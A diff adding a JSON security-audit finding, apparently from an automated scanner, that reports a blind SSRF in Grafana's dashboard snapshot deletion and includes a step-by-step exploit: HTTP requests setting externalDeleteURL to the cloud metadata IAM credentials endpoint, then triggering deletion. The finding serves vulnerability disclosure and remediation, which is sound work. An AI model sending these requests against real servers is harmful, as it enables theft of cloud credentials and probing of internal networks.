@@ -1,0 +1,23 @@
+[
+  {
+    "FindingID": "f1d506d1-717f-597b-8de7-be11ebeede43",
+    "SessionID": "ChA4MGMzZTAxMzAzM2U5NzQ4EAgaATAqBG1haW4",
+    "Title": "Blind SSRF via externalDeleteURL in Dashboard Snapshot deletion",
+    "FilePath": "pkg/api/dashboard_snapshot.go",
+    "Severity": "HIGH",
+    "Confidence": 100,
+    "Analysis": "In `CreateDashboardSnapshot` (defined in `pkg/services/dashboardsnapshots/service.go`), when creating a snapshot, if `cmd.DashboardCreateCommand.External` is false (meaning it is a local snapshot), the field `cmd.ExternalDeleteURL` is not validated or cleared, but is bound directly from user input via `web.Bind(c.Req, \u0026cmd)` in `CreateDashboardSnapshot` (defined in `pkg/api/dashboard_snapshot.go`). \n\nSince `ExternalDeleteURL` is saved in the database under `cmd.ExternalDeleteURL` (saved in `pkg/services/dashboardsnapshots/database/database.go`), a malicious user can supply an arbitrary URL for `ExternalDeleteURL` in the POST request body (e.g., `{\"external\": false, \"externalDeleteURL\": \"http://169.254.169.254/latest/meta-data/\"}`) during snapshot creation.\n\nLater, when the snapshot is deleted by key (either by the creator using the `deleteKey` via `DELETE /api/snapshots/:key` or via `/api/snapshots-delete/:deleteKey`), if `queryResult.External` is set to true (or even if we set `external: true` in the initial creation request, which is saved in the database since `External` is also bound from user input), the backend calls `DeleteExternalDashboardSnapshot(queryResult.ExternalDeleteURL)` in `pkg/services/dashboardsnapshots/service.go` which performs an unauthenticated HTTP GET request to the user-supplied `ExternalDeleteURL` via `client.Get(externalUrl)`.\n\nThis results in a Blind Server-Side Request Forgery (SSRF) vulnerability. An attacker can use this to scan internal services, access internal cloud metadata endpoints, or trigger arbitrary internal GET endpoints under the context of the Grafana server.\n\n### Conceptual Exploit Payload\n\n1. Create a snapshot with a malicious `externalDeleteURL` pointing to an internal target:\n```http\nPOST /api/snapshots HTTP/1.1\nHost: grafana.local\nContent-Type: application/json\nAuthorization: Bearer \u003ctoken\u003e\n\n{\n  \"dashboard\": {\n    \"title\": \"Malicious Snapshot\",\n    \"uid\": \"abc123xyz\"\n  },\n  \"external\": true,\n  \"externalDeleteURL\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\n}\n```\n\n2. The response will contain the `deleteKey` for the newly created snapshot:\n```json\n{\n  \"key\": \"...\",\n  \"deleteKey\": \"some-delete-key\",\n  \"url\": \"...\",\n  \"deleteUrl\": \"...\"\n}\n```\n\n3. Delete the snapshot using the returned `deleteKey` to trigger the SSRF:\n```http\nGET /api/snapshots-delete/some-delete-key HTTP/1.1\nHost: grafana.local\n```",
+    "Snippet": "\tif queryResult.External {\n\t\terr := dashboardsnapshots.DeleteExternalDashboardSnapshot(queryResult.ExternalDeleteURL)\n\t\tif err != nil {\n\t\t\treturn response.Error(http.StatusInternalServerError, \"Failed to delete external dashboard\", err)\n\t\t}\n\t}",
+    "VulnType": "SSRF",
+    "VulnID": "CWE-918",
+    "Fingerprint": "",
+    "Status": "OPEN",
+    "SourceStage": "",
+    "FindingJSON": "",
+    "UpdatedAt": "",
+    "StartLine": 190,
+    "EndLine": 219,
+    "DismissReason": "",
+    "ConfidenceLevel": ""
+  }
+]
